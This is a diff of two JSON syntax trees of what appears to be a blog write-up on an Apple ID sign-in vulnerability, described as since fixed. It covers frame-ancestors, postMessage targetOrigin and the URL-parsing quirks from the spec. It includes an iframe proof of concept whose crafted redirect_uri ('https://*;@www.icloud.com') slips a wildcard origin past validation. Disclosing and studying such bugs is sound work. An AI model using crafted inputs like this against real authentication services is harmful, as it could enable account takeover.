<               "column": 37,
<               "offset": 22501
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 464,
<           "column": 1,
<           "offset": 22148
<         },
<         "end": {
<           "line": 468,
<           "column": 37,
<           "offset": 22501
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTML",
<       "meta": null,
<       "value": "<iframe\nsrc=\"https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2F*;@www.icloud.com&response_mode=web_message&response_type=code&frame_id=72948678-5374-4a90-a176-31f75bb38405&locale=en_GB\"></iframe>",
<       "position": {
<         "start": {
<           "line": 470,
<           "column": 1,
<           "offset": 22505
<         },
<         "end": {
<           "line": 473,
<           "column": 4,
<           "offset": 22823
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If you go back in time to before this was fixed and you use this HTML code you\nwill notice two things: (1) the ",
<           "position": {
<             "start": {
<               "line": 475,
<               "column": 1,
<               "offset": 22827
<             },
<             "end": {
<               "line": 476,
<               "column": 33,
<               "offset": 22939
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 476,
<               "column": 33,
<               "offset": 22939
<             },
<             "end": {
<               "line": 476,
<               "column": 50,
<               "offset": 22956
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " directive is correctly sent as\n",
<           "position": {
<             "start": {
<               "line": 476,
<               "column": 50,
<               "offset": 22956
<             },
<             "end": {
<               "line": 477,
<               "column": 1,
<               "offset": 22989
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors https://*;@www.icloud.com",
<           "position": {
<             "start": {
<               "line": 477,
<               "column": 1,
<               "offset": 22989
<             },
<             "end": {
<               "line": 477,
<               "column": 44,
<               "offset": 23032
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and (2) all we get from the world's\nmost overengineered embed is a big, slightly off-white box.",
<           "position": {
<             "start": {
<               "line": 477,
<               "column": 44,
<               "offset": 23032
<             },
<             "end": {
<               "line": 478,
<               "column": 60,
<               "offset": 23129
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 475,
<           "column": 1,
<           "offset": 22827
<         },
<         "end": {
<           "line": 478,
<           "column": 60,
<           "offset": 23129
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "It's a big, slightly off-white box that's from fricken' ",
<           "position": {
<             "start": {
<               "line": 480,
<               "column": 1,
<               "offset": 23133
<             },
<             "end": {
<               "line": 480,
<               "column": 57,
<               "offset": 23189
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "apple.com",
<           "position": {
<             "start": {
<               "line": 480,
<               "column": 57,
<               "offset": 23189
<             },
<             "end": {
<               "line": 480,
<               "column": 68,
<               "offset": 23200
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", but still!",
<           "position": {
<             "start": {
<               "line": 480,
<               "column": 68,
<               "offset": 23200
<             },
<             "end": {
<               "line": 480,
<               "column": 80,
<               "offset": 23212
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 480,
<           "column": 1,
<           "offset": 23133
<         },
<         "end": {
<           "line": 480,
<           "column": 80,
<           "offset": 23212
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": ";import box from './box.png';",
<           "position": {
<             "start": {
<               "line": 482,
<               "column": 1,
<               "offset": 23216
<             },
<             "end": {
<               "line": 482,
<               "column": 30,
<               "offset": 23245
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 482,
<           "column": 1,
<           "offset": 23216
<         },
<         "end": {
<           "line": 482,
<           "column": 30,
<           "offset": 23245
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "jsx",
<       "value": "<img src={box}/>",
<       "position": {
<         "start": {
<           "line": 484,
<           "column": 1,
<           "offset": 23249
<         },
<         "end": {
<           "line": 484,
<           "column": 17,
<           "offset": 23265
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "A Big, Slightly Off-White Box",
<           "position": {
<             "start": {
<               "line": 487,
<               "column": 1,
<               "offset": 23271
<             },
<             "end": {
<               "line": 487,
<               "column": 30,
<               "offset": 23300
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 487,
<           "column": 1,
<           "offset": 23271
<         },
<         "end": {
<           "line": 488,
<           "column": 30,
<           "offset": 23331
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "a big, slightly off-white box",
<       "label": "A Big, Slightly Off-White Box",
<       "title": null,
<       "url": "#url-parsing-my-old-friend",
<       "position": {
<         "start": {
<           "line": 490,
<           "column": 1,
<           "offset": 23335
<         },
<         "end": {
<           "line": 490,
<           "column": 60,
<           "offset": 23394
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§5",
<       "label": "§5",
<       "title": null,
<       "url": "#url-parsing-my-old-friend",
<       "position": {
<         "start": {
<           "line": 492,
<           "column": 1,
<           "offset": 23398
<         },
<         "end": {
<           "line": 492,
<           "column": 33,
<           "offset": 23430
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "There are readers among us, I imagine who see the previous few hundreds of words\nand think 'oh, good, we must be reaching the end, we've done the impossible and\nembedded Apple ID Signin. The author is so great i rate all of their blog posts\n10 out of 10 what an amazing blogger'.",
<           "position": {
<             "start": {
<               "line": 494,
<               "column": 1,
<               "offset": 23434
<             },
<             "end": {
<               "line": 497,
<               "column": 39,
<               "offset": 23716
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 494,
<           "column": 1,
<           "offset": 23434
<         },
<         "end": {
<           "line": 497,
<           "column": 39,
<           "offset": 23716
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "But you'd be wrong. We arrive only at the beginninning of by far the longest\nvulnerability I have ever found in a web application. It starts with this white\nbox.",
<           "position": {
<             "start": {
<               "line": 499,
<               "column": 1,
<               "offset": 23720
<             },
<             "end": {
<               "line": 501,
<               "column": 5,
<               "offset": 23883
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 499,
<           "column": 1,
<           "offset": 23720
<         },
<         "end": {
<           "line": 501,
<           "column": 5,
<           "offset": 23883
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Let's engage in a socratic diaglogue. I'll be Euclid.",
<           "position": {
<             "start": {
<               "line": 503,
<               "column": 1,
<               "offset": 23887
<             },
<             "end": {
<               "line": 503,
<               "column": 54,
<               "offset": 23940
9020,9043d15995
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 503,
<           "column": 1,
<           "offset": 23887
<         },
<         "end": {
<           "line": 503,
<           "column": 54,
<           "offset": 23940
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "blockquote",
<       "children": [
<         {
<           "type": "paragraph",
<           "children": [
9045,9046c15997,16222
<               "type": "text",
<               "value": "Euclid: Why is there a white box?",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "inlineCode",
>                   "value": "targetOrigin",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 1,
>                       "offset": 48385
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 15,
>                       "offset": 48399
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " would indicate that what should be passed in is an HTTP web origin, which has to be very strictly specified and for which, as mentioned before ",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 15,
>                       "offset": 48399
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 159,
>                       "offset": 48543
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://*;@icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 159,
>                       "offset": 48543
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 182,
>                       "offset": 48566
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is absolutely ",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 182,
>                       "offset": 48566
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 197,
>                       "offset": 48581
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "not",
>                       "position": {
>                         "start": {
>                           "line": 1001,
>                           "column": 198,
>                           "offset": 48582
>                         },
>                         "end": {
>                           "line": 1001,
>                           "column": 201,
>                           "offset": 48585
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 197,
>                       "offset": 48581
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 202,
>                       "offset": 48586
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " valid. In theory, that'd probably just mean that the call should never be able to get to us, but I dived into the ",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 202,
>                       "offset": 48586
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 317,
>                       "offset": 48701
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 317,
>                       "offset": 48701
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 330,
>                       "offset": 48714
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " specification, which defines",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 330,
>                       "offset": 48714
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 359,
>                       "offset": 48743
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "footnoteReference",
>                   "identifier": "2",
>                   "label": "2",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 359,
>                       "offset": 48743
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 363,
>                       "offset": 48747
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " the action of ",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 363,
>                       "offset": 48747
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 378,
>                       "offset": 48762
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 378,
>                       "offset": 48762
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 391,
>                       "offset": 48775
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " like this:",
>                   "position": {
>                     "start": {
>                       "line": 1001,
>                       "column": 391,
>                       "offset": 48775
>                     },
>                     "end": {
>                       "line": 1001,
>                       "column": 402,
>                       "offset": 48786
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
9049,9051c16225,16227
<                   "line": 505,
<                   "column": 3,
<                   "offset": 23946
---
>                   "line": 1001,
>                   "column": 1,
>                   "offset": 48385
9054,9056c16230,16232
<                   "line": 505,
<                   "column": 36,
<                   "offset": 23979
---
>                   "line": 1001,
>                   "column": 402,
>                   "offset": 48786
9060,9071d16235
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 505,
<               "column": 3,
<               "offset": 23946
<             },
<             "end": {
<               "line": 505,
<               "column": 36,
<               "offset": 23979
9073,9078d16236
<             "indent": []
<           }
<         },
<         {
<           "type": "paragraph",
<           "children": [
9080,9081c16238,17151
<               "type": "text",
<               "value": "You: Why am I in this? I thought I was\nthe reader.",
---
>               "type": "list",
>               "ordered": true,
>               "start": 1,
>               "spread": false,
>               "children": [
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "Let ",
>                           "position": {
>                             "start": {
>                               "line": 1003,
>                               "column": 5,
>                               "offset": 48794
>                             },
>                             "end": {
>                               "line": 1003,
>                               "column": 9,
>                               "offset": 48798
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "targetRealm",
>                           "position": {
>                             "start": {
>                               "line": 1003,
>                               "column": 9,
>                               "offset": 48798
>                             },
>                             "end": {
>                               "line": 1003,
>                               "column": 22,
>                               "offset": 48811
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " be ",
>                           "position": {
>                             "start": {
>                               "line": 1003,
>                               "column": 22,
>                               "offset": 48811
>                             },
>                             "end": {
>                               "line": 1003,
>                               "column": 26,
>                               "offset": 48815
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "targetWindow",
>                           "position": {
>                             "start": {
>                               "line": 1003,
>                               "column": 26,
>                               "offset": 48815
>                             },
>                             "end": {
>                               "line": 1003,
>                               "column": 40,
>                               "offset": 48829
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": "'s Realm.",
>                           "position": {
>                             "start": {
>                               "line": 1003,
>                               "column": 40,
>                               "offset": 48829
>                             },
>                             "end": {
>                               "line": 1003,
>                               "column": 49,
>                               "offset": 48838
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1003,
>                           "column": 5,
>                           "offset": 48794
>                         },
>                         "end": {
>                           "line": 1003,
>                           "column": 49,
>                           "offset": 48838
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1003,
>                       "column": 1,
>                       "offset": 48790
>                     },
>                     "end": {
>                       "line": 1003,
>                       "column": 49,
>                       "offset": 48838
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "Let ",
>                           "position": {
>                             "start": {
>                               "line": 1004,
>                               "column": 5,
>                               "offset": 48844
>                             },
>                             "end": {
>                               "line": 1004,
>                               "column": 9,
>                               "offset": 48848
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "incumbentSettings",
>                           "position": {
>                             "start": {
>                               "line": 1004,
>                               "column": 9,
>                               "offset": 48848
>                             },
>                             "end": {
>                               "line": 1004,
>                               "column": 28,
>                               "offset": 48867
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " be the incumbent settings object.",
>                           "position": {
>                             "start": {
>                               "line": 1004,
>                               "column": 28,
>                               "offset": 48867
>                             },
>                             "end": {
>                               "line": 1004,
>                               "column": 62,
>                               "offset": 48901
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1004,
>                           "column": 5,
>                           "offset": 48844
>                         },
>                         "end": {
>                           "line": 1004,
>                           "column": 62,
>                           "offset": 48901
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1004,
>                       "column": 1,
>                       "offset": 48840
>                     },
>                     "end": {
>                       "line": 1004,
>                       "column": 62,
>                       "offset": 48901
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "Let ",
>                           "position": {
>                             "start": {
>                               "line": 1005,
>                               "column": 5,
>                               "offset": 48907
>                             },
>                             "end": {
>                               "line": 1005,
>                               "column": 9,
>                               "offset": 48911
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "targetOrigin",
>                           "position": {
>                             "start": {
>                               "line": 1005,
>                               "column": 9,
>                               "offset": 48911
>                             },
>                             "end": {
>                               "line": 1005,
>                               "column": 23,
>                               "offset": 48925
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " be ",
>                           "position": {
>                             "start": {
>                               "line": 1005,
>                               "column": 23,
>                               "offset": 48925
>                             },
>                             "end": {
>                               "line": 1005,
>                               "column": 27,
>                               "offset": 48929
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "options[\"targetOrigin\"]",
>                           "position": {
>                             "start": {
>                               "line": 1005,
>                               "column": 27,
>                               "offset": 48929
>                             },
>                             "end": {
>                               "line": 1005,
>                               "column": 52,
>                               "offset": 48954
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": ".",
>                           "position": {
>                             "start": {
>                               "line": 1005,
>                               "column": 52,
>                               "offset": 48954
>                             },
>                             "end": {
>                               "line": 1005,
>                               "column": 53,
>                               "offset": 48955
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1005,
>                           "column": 5,
>                           "offset": 48907
>                         },
>                         "end": {
>                           "line": 1005,
>                           "column": 53,
>                           "offset": 48955
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1005,
>                       "column": 1,
>                       "offset": 48903
>                     },
>                     "end": {
>                       "line": 1005,
>                       "column": 53,
>                       "offset": 48955
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "If ",
>                           "position": {
>                             "start": {
>                               "line": 1006,
>                               "column": 5,
>                               "offset": 48961
>                             },
>                             "end": {
>                               "line": 1006,
>                               "column": 8,
>                               "offset": 48964
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "targetOrigin",
>                           "position": {
>                             "start": {
>                               "line": 1006,
>                               "column": 8,
>                               "offset": 48964
>                             },
>                             "end": {
>                               "line": 1006,
>                               "column": 22,
>                               "offset": 48978
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " is a single U+002F SOLIDUS character (/), then set ",
>                           "position": {
>                             "start": {
>                               "line": 1006,
>                               "column": 22,
>                               "offset": 48978
>                             },
>                             "end": {
>                               "line": 1006,
>                               "column": 74,
>                               "offset": 49030
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "targetOrigin",
>                           "position": {
>                             "start": {
>                               "line": 1006,
>                               "column": 74,
>                               "offset": 49030
>                             },
>                             "end": {
>                               "line": 1006,
>                               "column": 88,
>                               "offset": 49044
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " to ",
>                           "position": {
>                             "start": {
>                               "line": 1006,
>                               "column": 88,
>                               "offset": 49044
>                             },
>                             "end": {
>                               "line": 1006,
>                               "column": 92,
>                               "offset": 49048
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "incumbentSettings",
>                           "position": {
>                             "start": {
>                               "line": 1006,
>                               "column": 92,
>                               "offset": 49048
>                             },
>                             "end": {
>                               "line": 1006,
>                               "column": 111,
>                               "offset": 49067
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": "'s origin.",
>                           "position": {
>                             "start": {
>                               "line": 1006,
>                               "column": 111,
>                               "offset": 49067
>                             },
>                             "end": {
>                               "line": 1006,
>                               "column": 121,
>                               "offset": 49077
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1006,
>                           "column": 5,
>                           "offset": 48961
>                         },
>                         "end": {
>                           "line": 1006,
>                           "column": 121,
>                           "offset": 49077
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1006,
>                       "column": 1,
>                       "offset": 48957
>                     },
>                     "end": {
>                       "line": 1006,
>                       "column": 121,
>                       "offset": 49077
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "Otherwise, if ",
>                           "position": {
>                             "start": {
>                               "line": 1007,
>                               "column": 5,
>                               "offset": 49083
>                             },
>                             "end": {
>                               "line": 1007,
>                               "column": 19,
>                               "offset": 49097
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "targetOrigin",
>                           "position": {
>                             "start": {
>                               "line": 1007,
>                               "column": 19,
>                               "offset": 49097
>                             },
>                             "end": {
>                               "line": 1007,
>                               "column": 33,
>                               "offset": 49111
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " is not a single U+002A ASTERISK character (*), then:  ",
>                           "position": {
>                             "start": {
>                               "line": 1007,
>                               "column": 33,
>                               "offset": 49111
>                             },
>                             "end": {
>                               "line": 1007,
>                               "column": 88,
>                               "offset": 49166
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1007,
>                           "column": 5,
>                           "offset": 49083
>                         },
>                         "end": {
>                           "line": 1007,
>                           "column": 88,
>                           "offset": 49166
>                         },
>                         "indent": []
>                       }
>                     },
>                     {
>                       "type": "list",
>                       "ordered": true,
>                       "start": 1,
>                       "spread": false,
>                       "children": [
>                         {
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Let ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1008,
>                                       "column": 8,
>                                       "offset": 49175
>                                     },
>                                     "end": {
>                                       "line": 1008,
>                                       "column": 12,
>                                       "offset": 49179
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "inlineCode",
>                                   "value": "parsedURL",
>                                   "position": {
>                                     "start": {
>                                       "line": 1008,
>                                       "column": 12,
>                                       "offset": 49179
>                                     },
>                                     "end": {
>                                       "line": 1008,
>                                       "column": 23,
>                                       "offset": 49190
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "text",
>                                   "value": " be the result of running the URL parser on ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1008,
>                                       "column": 23,
>                                       "offset": 49190
>                                     },
>                                     "end": {
>                                       "line": 1008,
>                                       "column": 67,
>                                       "offset": 49234
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "inlineCode",
>                                   "value": "targetOrigin",
>                                   "position": {
>                                     "start": {
>                                       "line": 1008,
>                                       "column": 67,
>                                       "offset": 49234
>                                     },
>                                     "end": {
>                                       "line": 1008,
>                                       "column": 81,
>                                       "offset": 49248
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "text",
>                                   "value": ".  ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1008,
>                                       "column": 81,
>                                       "offset": 49248
>                                     },
>                                     "end": {
>                                       "line": 1008,
>                                       "column": 84,
>                                       "offset": 49251
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1008,
>                                   "column": 8,
>                                   "offset": 49175
>                                 },
>                                 "end": {
>                                   "line": 1008,
>                                   "column": 84,
>                                   "offset": 49251
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
>                           "position": {
>                             "start": {
>                               "line": 1008,
>                               "column": 5,
>                               "offset": 49172
>                             },
>                             "end": {
>                               "line": 1008,
>                               "column": 84,
>                               "offset": 49251
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "If ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1009,
>                                       "column": 8,
>                                       "offset": 49260
>                                     },
>                                     "end": {
>                                       "line": 1009,
>                                       "column": 11,
>                                       "offset": 49263
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "inlineCode",
>                                   "value": "parsedURL",
>                                   "position": {
>                                     "start": {
>                                       "line": 1009,
>                                       "column": 11,
>                                       "offset": 49263
>                                     },
>                                     "end": {
>                                       "line": 1009,
>                                       "column": 22,
>                                       "offset": 49274
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "text",
>                                   "value": " is failure, then throw a \"SyntaxError\" DOMException.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1009,
>                                       "column": 22,
>                                       "offset": 49274
>                                     },
>                                     "end": {
>                                       "line": 1009,
>                                       "column": 75,
>                                       "offset": 49327
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1009,
>                                   "column": 8,
>                                   "offset": 49260
>                                 },
>                                 "end": {
>                                   "line": 1009,
>                                   "column": 75,
>                                   "offset": 49327
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
>                           "position": {
>                             "start": {
>                               "line": 1009,
>                               "column": 5,
>                               "offset": 49257
>                             },
>                             "end": {
>                               "line": 1009,
>                               "column": 75,
>                               "offset": 49327
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1008,
>                           "column": 5,
>                           "offset": 49172
>                         },
>                         "end": {
>                           "line": 1009,
>                           "column": 75,
>                           "offset": 49327
>                         },
>                         "indent": [
>                           5
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1007,
>                       "column": 1,
>                       "offset": 49079
>                     },
>                     "end": {
>                       "line": 1009,
>                       "column": 75,
>                       "offset": 49327
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "Set ",
>                           "position": {
>                             "start": {
>                               "line": 1010,
>                               "column": 5,
>                               "offset": 49333
>                             },
>                             "end": {
>                               "line": 1010,
>                               "column": 9,
>                               "offset": 49337
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "targetOrigin",
>                           "position": {
>                             "start": {
>                               "line": 1010,
>                               "column": 9,
>                               "offset": 49337
>                             },
>                             "end": {
>                               "line": 1010,
>                               "column": 23,
>                               "offset": 49351
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " to parsedURL's origin.",
>                           "position": {
>                             "start": {
>                               "line": 1010,
>                               "column": 23,
>                               "offset": 49351
>                             },
>                             "end": {
>                               "line": 1010,
>                               "column": 46,
>                               "offset": 49374
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1010,
>                           "column": 5,
>                           "offset": 49333
>                         },
>                         "end": {
>                           "line": 1010,
>                           "column": 46,
>                           "offset": 49374
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1010,
>                       "column": 1,
>                       "offset": 49329
>                     },
>                     "end": {
>                       "line": 1010,
>                       "column": 46,
>                       "offset": 49374
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
9084,9086c17154,17156
<                   "line": 507,
<                   "column": 3,
<                   "offset": 23986
---
>                   "line": 1003,
>                   "column": 1,
>                   "offset": 48790
9089,9091c17159,17161
<                   "line": 508,
<                   "column": 12,
<                   "offset": 24037
---
>                   "line": 1010,
>                   "column": 46,
>                   "offset": 49374
9093a17164,17169
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
9097,9108d17172
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 507,
<               "column": 3,
<               "offset": 23986
<             },
<             "end": {
<               "line": 508,
<               "column": 12,
<               "offset": 24037
9110,9117d17173
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "paragraph",
<           "children": [
9119,9120c17175,17234
<               "type": "text",
<               "value": "Euclid: Why is there a white box?",
---
>               "type": "footnoteDefinition",
>               "identifier": "2",
>               "label": "2",
>               "children": [
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "link",
>                       "title": null,
>                       "url": "https://html.spec.whatwg.org/multipage/web-messaging.html#posting-messages",
>                       "children": [
>                         {
